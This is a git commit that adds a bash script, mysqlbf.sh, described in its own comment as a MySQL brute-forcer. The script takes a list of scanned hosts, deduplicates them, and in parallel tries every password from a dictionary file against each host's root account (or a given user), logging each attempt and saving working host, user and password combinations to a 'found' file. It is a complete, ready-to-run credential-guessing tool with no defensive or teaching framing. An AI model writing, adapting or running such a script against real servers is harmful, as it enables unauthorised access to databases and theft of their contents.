5e1c097c363f708371c853b6db91c10aadc9f19d
lucidtrip <lucid.trip@mail.ru>
2018-07-26 10:33:10 +0000

    Create mysqlbf.sh

---
+++ mysqlbf.sh
@@ -0,0 +1,48 @@
+#!/bin/bash
+
+# date: 08/07/2018
+# function: bruteforce mysql 
+#
+#
+
+if [ -z "$1" ]; then
+    echo "USAGE: start with a result file with the hosts or ips"
+    echo "> bash $0 mysql-results.txt"
+elif [ -s "$1" ]; then
+    readonly MYSQLFILE="$1"
+    # if first argv a file and is not zero size
+    xargs -i -a "$MYSQLFILE" -n 1 -P 15 echo "{}" | awk -F ":" '{print $1}' >  result_mysql-cut.txt
+    cat result_mysql-cut.txt | sort | uniq > result_mysql-cut2.txt
+    rm result_mysql-cut.txt
+    mv result_mysql-cut2.txt result_mysql-cut.txt
+    xargs -i -a result_mysql-cut.txt -n 1 -P 5 bash "$0" "{}" txt/pass_pma.txt root > "${0}-mysqlbrute.log"
+else
+    readonly HOSTNAME="$1"
+    readonly PASSDIC="$2"
+    if [ -z "$3" ]; then
+       readonly USER="root"
+    else
+       readonly USER="$3"
+    fi
+
+    echo "$(date): check ${HOSTNAME} with ${USER}:${PASSDIC}" >> "${0}.log"
+    
+    cat "$PASSDIC" | while read line
+    do
+       if [ -z "$line" ]; then
+          continue
+       fi
+       line=$(echo "$line" |tr -d "\n")
+       echo "$line"
+       echo "$(date): check ${HOSTNAME} with ${USER}:${line}" >> "${0}_user-pass.log"
+       mysqlbf=$(mysql -h"$HOSTNAME" -u"${USER}" -p"${line}" -e "show databases")
+       #echo "$mysqlbf"
+       if [[ $mysqlbf = *"Database"* ]]; then
+           echo "${HOSTNAME}@${USER}:${line}" >> "${0}-found.txt"
+       fi
+    done
+
+    #cat found.txt
+fi
+
+#EOF
